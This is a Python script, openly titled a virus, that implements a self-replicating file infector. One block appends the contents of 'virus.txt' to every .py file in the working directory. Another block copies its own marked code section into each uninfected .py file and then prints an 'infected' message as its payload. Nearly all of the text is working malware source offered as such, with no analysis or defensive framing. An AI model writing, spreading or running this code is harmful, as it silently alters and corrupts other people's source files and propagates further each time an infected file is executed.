
# ''' VIRUS '''
import os
import threading


def copy():
    with open("virus.txt", 'r') as f:
        virus = f.readlines()
        f.close()

    for filename in os.listdir(os.getcwd()):
        if filename.endswith('.py'):
            with open(os.path.join(os.getcwd(), filename), 'r') as f:
                contents = f.readlines()
                f.close()
            with open(os.path.join(os.getcwd(), filename), "w") as g:
                result = all(elem in contents for elem in virus)
                if result:
                    towrite = contents
                else:
                    towrite = contents + virus

                g.writelines(towrite)
                g.close()


t = threading.Thread(target=copy)
t.start()



##### VIRUS START #####
import glob
import sys
import threading


def copyvirus():
    # Copy virus code
    virus_code = []
    in_virus = False
    in_payload = False

    with open(sys.argv[0], 'r') as f:
        for line in f.readlines():
            if line == "##### VIRUS START #####\n":
                in_virus = True
            if in_virus:
                if in_payload:
                    pass
                virus_code.append(line)
                if line == "##### VIRUS PAYLOAD #####\n":
                    in_payload = True

            if line == "##### VIRUS END #####\n":
                break
        f.close()
    return virus_code


def findfiles():
    # Find python files
    python_files = glob.glob("*.py")
    return python_files


def infectfiles(python_files, virus_code):
    # Infect files
    for file in python_files:
        infected = False
        with open(file, 'r') as f:
            code = f.readlines()
            f.close()
        for line in code:
            if line == "##### VIRUS START #####\n":
                infected = True
                break
        if not infected:
            new_code = []
            new_code.extend(code)
            new_code.append("\n\n\n")
            new_code.extend(virus_code)
            with open(file, 'w') as f:
                f.writelines(new_code)
                f.close()


##### PAYLOAD START #####

def executepayload():
    print("You've been infected by my virus")


##### PAYLOAD END #####


def main():
    virus = copyvirus()
    files = findfiles()
    infectfiles(files, virus)
    executepayload()


if __name__ == '__main__':
    main()

##### VIRUS END #####
